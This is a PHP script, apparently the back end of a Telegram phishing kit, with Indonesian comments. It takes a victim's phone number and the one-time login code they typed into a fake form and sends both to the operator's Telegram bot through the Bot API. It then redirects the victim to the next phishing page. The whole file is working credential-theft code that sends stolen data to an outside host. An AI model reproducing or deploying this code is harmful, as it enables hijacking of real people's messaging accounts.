<?php
include "./api/telegram.php";
session_start();

// Ambil nomor HP dan OTP dari form
$phone = $_SESSION['phoneNumber'];
$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
$pin5 = $_POST['pin5'];
$pin = $pin1 . $pin2 . $pin3 . $pin4 . $pin5;
$_SESSION['pin'] = $pin;

// Format pesan dengan Markdown (pakai backtick)
$message = "
( OTP | $phone )

- No HP : `$phone`
- Code OTP : `$pin` via Telegram
";

// Fungsi kirim ke bot
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url .= "&text=" . urlencode($message);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// Ambil ID bot dari session (diset saat input nomor HP)
$bot_id = $_SESSION['bot_id'] ?? 1;

// Kirim ke bot yang sesuai
if ($bot_id === 1) {
    sendMessage($id_telegram1, $message, $id_botTele1);
} else {
    sendMessage($id_telegram2, $message, $id_botTele2);
}

// Arahkan ke halaman berikutnya
header('Location: ../otp/');
exit();
